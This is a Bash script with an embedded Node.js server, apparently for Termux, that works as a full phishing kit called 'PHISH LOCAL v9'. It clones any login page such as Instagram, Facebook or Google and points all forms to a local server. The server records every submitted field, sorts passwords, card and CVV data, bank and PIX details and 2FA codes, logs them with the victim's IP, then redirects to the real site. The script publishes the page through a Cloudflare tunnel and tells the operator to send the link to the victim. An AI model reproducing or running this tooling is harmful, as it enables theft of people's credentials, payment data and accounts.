#!/bin/bash
# ============================================
# 🎣 PHISH LOCAL v9 - Universal Wordlist
# Captura QUALQUER campo de QUALQUER site
# Cloudflare Tunnel | Sem root | Sem login
# ============================================

SITE_DIR="site_clone"
LOG_FILE="capturas.txt"
SERVER_FILE="server/server.js"
mkdir -p "$SITE_DIR" server

# Verificar node
if ! command -v node &>/dev/null; then
    echo "[!] Node.js nao encontrado. Rode: pkg install nodejs -y"
    exit 1
fi

# =============================================
# WORDLIST - Nomes comuns de campos de login
# =============================================
WORDLIST=(
    "login" "signin" "sign_in" "log_in" "entrar" "acessar" "acesso"
    "sign-in" "log-in" "singin" "sing_in" "iniciar_sessao" "iniciar"
    "cadastrar" "cadastro" "registrar" "registro" "criar_conta"
    "create_account" "subscribe" "inscricao" "username" "user_name"
    "user-name" "usuario" "nome" "name" "email" "e-mail" "mail"
    "telefone" "phone" "telemovel" "celular" "cpf" "cnpj" "documento"
    "rg" "identificacao" "matricula" "identification" "identifier"
    "login_id" "loginid" "userid" "user" "uname" "nick" "nickname"
    "login_email" "login_phone" "password" "senha" "pass" "passwd"
    "pwd" "palavra" "chave" "secret" "pin" "codigo" "fullname"
    "first_name" "lastname" "sobrenome" "social_name" "razao_social"
    "mae" "pai" "data" "date" "nascimento" "birth" "birthdate"
    "ano" "mes" "dia" "endereco" "endereco" "rua" "avenida" "address"
    "street" "cep" "zip" "zipcode" "bairro" "cidade" "cidade" "pais"
    "country" "complemento" "empresa" "company" "trabalho" "profissao"
    "escola" "school" "universidade" "university" "curso" "course"
    "departamento" "department" "cargo" "cartao" "card" "credit_card"
    "cvv" "validade" "conta" "account" "banco" "bank" "agencia" "pix"
    "token" "otp" "verification" "captcha" "2fa" "auth" "pergunta"
    "resposta" "termos" "terms" "privacidade" "privacy" "aceitar"
    "remember" "newsletter" "linguagem" "language" "pais" "country"
    "genero" "sexo" "gender" "estado civil" "civil status" "casado"
    "solteiro" "numero" "number" "andap" "andar" "apartamento" "ap"
    "complemento" "bloco" "unidade" "disciplina" "subject" "materia"
    "professor" "docente" "teacher" "nota" "grade" "score" "media"
    "mensagem" "message" "comentario" "comment" "observacao" "link"
    "url" "website" "site" "imagem" "foto" "image" "picture" "upload"
    "arquivo" "file" "anexo" "attachment" "valor" "value" "preco"
    "price" "quantidade" "qtd" "total" "tipo" "type" "categoria"
    "category" "status" "situacao" "state" "acao" "action" "operacao"
    "operation" "id" "uuid" "chave" "key" "hash" "campo" "field"
    "input" "descricao" "description" "titulo" "title" "assunto" "subject"
    "titulo" "mensagem" "message" "data" "date" "hora" "time" "periodo"
)

# Converter wordlist para JSON
WORDLIST_JSON="["
for w in "${WORDLIST[@]}"; do
    WORDLIST_JSON+="\"$w\","
done
WORDLIST_JSON="${WORDLIST_JSON%,}]"

# =============================================
# MENU PRINCIPAL
# =============================================
clear
echo ""
echo "=========================================="
echo "     PHISH LOCAL v9 - Universal Wordlist"
echo "=========================================="
echo ""
echo "  1) Criar phishing"
echo "  2) Ver capturas"
echo "  3) Limpar site"
echo "  4) Sair"
echo ""
echo -n "Escolha: "
read MENU

if [ "$MENU" = "1" ]; then

    echo ""
    echo "=========================================="
    echo "  CONFIGURAR PHISHING"
    echo "=========================================="
    echo ""
    echo "Qual site de login voce quer clonar?"
echo ""
echo "  - https://www.instagram.com"
echo "  - https://www.facebook.com"
echo "  - https://accounts.google.com"
echo "  - https://login.live.com"
echo "  - OU QUALQUER outro site de login"
echo ""
echo -n "URL do site: "
read TARGET_URL
[ -z "$TARGET_URL" ] && echo "URL vazia!" && exit 1
[[ ! "$TARGET_URL" =~ ^https?:// ]] && TARGET_URL="https://$TARGET_URL"

echo ""
echo "Que nome voce quer pro link?"
echo "  Ex: instagram, facebook, gmail, autocarlocadora"
echo -n "Nome: "
read LOCAL_NAME
[ -z "$LOCAL_NAME" ] && LOCAL_NAME="login"

echo ""
echo "Porta [8080]: "
echo -n "> "
read PORT
[ -z "$PORT" ] && PORT=8080

echo ""
echo "Redirecionar pra onde depois do login?"
echo -n "URL: "
read REDIRECT_URL
[ -z "$REDIRECT_URL" ] && REDIRECT_URL="$TARGET_URL"
[[ ! "$REDIRECT_URL" =~ ^https?:// ]] && REDIRECT_URL="https://$REDIRECT_URL"

    # --- CLONAR SITE ---
    clear
    echo ""
    echo "[...] Clonando $TARGET_URL"
    echo ""
    rm -rf "$SITE_DIR"/*

    curl -s -L -o "$SITE_DIR/index.html" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
        -H "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8" \
        "$TARGET_URL" 2>/dev/null

    if [ ! -f "$SITE_DIR/index.html" ] || [ $(wc -c < "$SITE_DIR/index.html") -lt 100 ]; then
        echo "[AVISO] Nao foi possivel clonar. Usando pagina generica."
        touch "$SITE_DIR/index.html"
    fi

    echo "[...] Baixando recursos..."
    for css in $(grep -oE 'href="[^"]*\.css"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//'); do
        fname=$(basename "$css")
        [ -f "$SITE_DIR/$fname" ] && continue
        if [[ "$css" == http* ]]; then
            curl -s -L -o "$SITE_DIR/$fname" "$css" 2>/dev/null
        elif [[ "$css" == /* ]]; then
            BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
            curl -s -L -o "$SITE_DIR/$fname" "$BASE$css" 2>/dev/null
        fi
    done

    for js in $(grep -oE 'src="[^"]*\.js"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
        fname=$(basename "$js")
        [ -f "$SITE_DIR/$fname" ] && continue
        if [[ "$js" == http* ]]; then
            curl -s -L -o "$SITE_DIR/$fname" "$js" 2>/dev/null
        elif [[ "$js" == /* ]]; then
            BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
            curl -s -L -o "$SITE_DIR/$fname" "$BASE$js" 2>/dev/null
        fi
    done

    for img in $(grep -oE 'src="[^"]*\.(png|jpg|jpeg|gif|svg|webp)"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
        fname=$(basename "$img")
        [ -f "$SITE_DIR/$fname" ] && continue
        if [[ "$img" == http* ]]; then
            curl -s -L -o "$SITE_DIR/$fname" "$img" 2>/dev/null
        elif [[ "$img" == /* ]]; then
            BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
            curl -s -L -o "$SITE_DIR/$fname" "$BASE$img" 2>/dev/null
        fi
    done

    sed -i 's/<form/<form method="POST" action="\/login"/gi' "$SITE_DIR/index.html"
    sed -i 's/action="[^"]*"/action="\/login"/gi' "$SITE_DIR/index.html"

    echo ""
    echo "[OK] Site clonado!"

    # --- CRIAR SERVIDOR ---
    cat > "$SERVER_FILE" << 'SERVEREOF'
const http=require('http'),fs=require('fs'),path=require('path');
const PORT=process.env.PORT||8080;
const SITE_DIR=process.env.SITE_DIR||'site_clone';
const LOG_FILE=process.env.LOG_FILE||'capturas.txt';
const REDIRECT=process.env.REDIRECT||'https://instagram.com';
const WORDLIST=PLACEHOLDER_WORDLIST;

function classifyField(name){
    name=(name||'').toLowerCase().replace(/[^a-z0-9_]/g,'');
    for(const w of WORDLIST){
        if(name.includes(w)||w.includes(name)){
            if(['login','signin','sign_in','log_in','entrar','acessar','iniciar','cadastrar','registrar','username','user','email','e-mail','telefone','phone','cpf','cnpj','matricula','identifier','userid'].some(x=>w.includes(x)||x.includes(w)))return'USUARIO';
            if(['password','senha','pass','passwd','pwd','palavra','chave','secret','pin','codigo'].some(x=>w.includes(x)||x.includes(w)))return'SENHA';
            if(['nome','name','fullname','firstname','lastname','sobrenome','social_name','razao_social','mae','pai'].some(x=>w.includes(x)||x.includes(w)))return'NOME';
            if(['data','date','nascimento','birth','birthdate','ano','mes','dia'].some(x=>w.includes(x)||x.includes(w)))return'DATA';
            if(['endereco','rua','avenida','address','street','cep','zip','zipcode','bairro','cidade','pais','country','complemento'].some(x=>w.includes(x)||x.includes(w)))return'ENDERECO';
            if(['empresa','company','trabalho','profissao','escola','universidade','curso','departamento','cargo','matricula'].some(x=>w.includes(x)||x.includes(w)))return'ESCOLA_TRABALHO';
            if(['cartao','card','credit_card','cvv','validade','conta','banco','agencia','pix'].some(x=>w.includes(x)||x.includes(w)))return'PAGAMENTO';
            if(['token','otp','verification','captcha','2fa','auth','pergunta','resposta'].some(x=>w.includes(x)||x.includes(w)))return'SEGURANCA';
            if(['termos','terms','privacidade','privacy','aceitar','remember','newsletter'].some(x=>w.includes(x)||x.includes(w)))return'PREFERENCIA';
            return'EXTRA';
        }
    }
    return'OUTRO';
}

function saveCapture(body,ip){
    try{
        const p=new URLSearchParams(body);
        const allFields={};
        const classified={USUARIO:[],SENHA:[],NOME:[],DATA:[],ENDERECO:[],ESCOLA_TRABALHO:[],PAGAMENTO:[],SEGURANCA:[],PREFERENCIA:[],EXTRA:[],OUTRO:[]};
        for(let[k,v]of p.entries()){
            allFields[k]=v;
            const cat=classifyField(k);
            classified[cat].push(k+': '+v);
        }
        const ts=new Date().toISOString().replace('T',' ').split('.')[0];
        fs.appendFileSync(LOG_FILE,JSON.stringify({timestamp:ts,ip:ip,fields:allFields,classified:classified})+'\n');
        console.log('\n'+'='.repeat(50));
        console.log('  CAPTURADO - '+ts);
        console.log('  IP: '+ip);
        console.log('='.repeat(50));
        for(const[cat,vals]of Object.entries(classified)){
            if(vals.length>0)console.log('  ['+cat+'] '+vals.join(' | '));
        }
        console.log('='.repeat(50)+'\n');
    }catch(e){}
}

http.createServer((req,res)=>{
    const ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    if(req.method==='POST'){
        let b='';
        req.on('data',c=>b+=c);
        req.on('end',()=>{
            saveCapture(b,ip);
            res.writeHead(302,{'Location':REDIRECT});
            res.end();
        });
        return;
    }
    let f=req.url==='/'?'/index.html':req.url.split('?')[0];
    f=path.join(SITE_DIR,f);
    const ext=path.extname(f).toLowerCase();
    const MIME={'.html':'text/html','.css':'text/css','.js':'application/javascript','.png':'image/png','.jpg':'image/jpeg','.jpeg':'image/jpeg','.gif':'image/gif','.svg':'image/svg+xml','.ico':'image/x-icon','.webp':'image/webp','.woff':'font/woff','.woff2':'font/woff2','.ttf':'font/ttf','.json':'application/json'};
    fs.readFile(f,(er,d)=>{
        if(er){
            res.writeHead(200,{'Content-Type':'text/html'});
            res.end('<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">\n<meta name="viewport" content="width=device-width,initial-scale=1.0">\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nbody{font-family:-apple-system,BlinkMacSystemFont:"Segoe UI",Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}\n.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}\nh1{font-size:44px;font-weight:300;margin-bottom:30px}\ninput{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}\ninput:focus{border-color:#a8a8a8}\nbutton{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}\nbutton:active{background:#1877f2}\n</style></head><body>\n<div class="card"><h1>Login</h1>\n<form method="POST"action="/login">\n<input type="text" name="username" placeholder="Usuario ou email" required>\n<input type="password" name="password" placeholder="Senha" required>\n<button type="submit">Entrar</button>\n</form></div></body></html>');
            return;
        }
        res.writeHead(200,{'Content-Type':MIME[ext]||'application/octet-stream'});
        res.end(d);
    });
}).listen(PORT,'0.0.0.0',()=>console.log('Servidor ativo porta '+PORT));
SERVEREOF

    # Substituir placeholder da wordlist
    sed -i "s/PLACEHOLDER_WORDLIST/$WORDLIST_JSON/" "$SERVER_FILE"

    # --- OBTER IP ---
    IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    [ -z "$IP" ] && IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
    [ -z "$IP" ] && IP="127.0.0.1"

    # --- CLOUDFLARE TUNNEL ---
    CF_INSTALLED=false
    if command -v cloudflared &>/dev/null; then
        CF_INSTALLED=true
    fi

    echo ""
    echo "=========================================="
    echo "  CLOUDFLARE TUNNEL (Link Publico Gratis)"
    echo "=========================================="
    echo ""

    if [ "$CF_INSTALLED" = true ]; then
        echo "[OK] Cloudflared ja instalado!"
        echo ""
        echo "  1) Usar Cloudflare Tunnel (recomendado)"
        echo "  2) Usar so o IP local"
        echo ""
        echo -n "Escolha: "
        read CF_CHOICE
    else
        echo "Cloudflared nao instalado."
        echo ""
        echo "Para instalar (recomendado):"
        echo "  pkg install cloudflared"
        echo ""
        echo "  1) Instalar cloudflared agora"
        echo "  2) Usar so o IP local"
        echo ""
        echo -n "Escolha: "
        read CF_CHOICE

        if [ "$CF_CHOICE" = "1" ]; then
            echo "[...] Instalando cloudflared..."
            pkg install cloudflared -y 2>/dev/null
            if command -v cloudflared &>/dev/null; then
                CF_INSTALLED=true
                echo "[OK] Instalado!"
            else
                echo "[ERRO] Falha na instalacao. Usando IP local."
                CF_CHOICE=2
            fi
        fi
    fi

    CF_URL=""
    if [ "$CF_CHOICE" = "1" ] && [ "$CF_INSTALLED" = true ]; then
        echo ""
        echo "[...] Criando tunnel... aguarde..."
        echo ""

        cloudflared tunnel --url "http://localhost:$PORT" > /tmp/cf_tunnel.log 2>&1 &
        CF_PID=$!

        # Esperar ate 15 segundos pela URL
        for i in $(seq 1 15); do
            sleep 1
            CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log 2>/dev/null | head -1)
            if [ -n "$CF_URL" ]; then
                break
            fi
        done

        if [ -n "$CF_URL" ]; then
            echo "[OK] Tunnel criado!"
        else
            echo "[AVISO] Tunnel nao gerou URL em 15s. Verifique o cloudflared."
        fi
    fi

    # --- MOSTRAR RESULTADO ---
    clear
    echo ""
    echo "=========================================="
    echo "         SERVIDOR PRONTO!"
    echo "=========================================="
    echo ""
    if [ -n "$CF_URL" ]; then
        echo "  🔥 URL PUBLICA (MANDE PRA VITIMA):"
        echo ""
        echo "    ${CF_URL}"
        echo ""
        echo "  Funciona de QUALQUER lugar do mundo!"
        echo "  (a pessoa clica e abre o site clonado)"
    else
        echo "  Acesse de qualquer dispositivo na mesma rede:"
        echo "  http://${IP}:${PORT}"
    fi
    echo ""
    echo "  Parar: Ctrl+C"
    echo ""
    echo "[*] Iniciando servidor..."
    echo ""

    REDIRECT="$REDIRECT_URL" PORT="$PORT" node "$SERVER_FILE"

    [ -n "$CF_PID" ] && kill $CF_PID 2>/dev/null

    echo ""
    echo "[*] Servidor parado."
    echo ""
    echo -n "Ver capturas? (s/n): "
    read V
    echo ""
    if [ "$V" = "s" ] || [ "$V" = "S" ]; then
        if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
            echo "=========================================="
            cat "$LOG_FILE"
            echo ""
            echo "=========================================="
        else
            echo "Nenhuma captura."
        fi
    fi

elif [ "$MENU" = "2" ]; then
    echo ""
    if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
        echo "=========================================="
        cat "$LOG_FILE"
        echo ""
        echo "=========================================="
    else
        echo "Nenhuma captura."
    fi

elif [ "$MENU" = "3" ]; then
    rm -rf "$SITE_DIR"/*
    echo "[OK] Site removido."

elif [ "$MENU" = "4" ]; then
    exit 0

else
    echo "Opcao invalida!"
fi
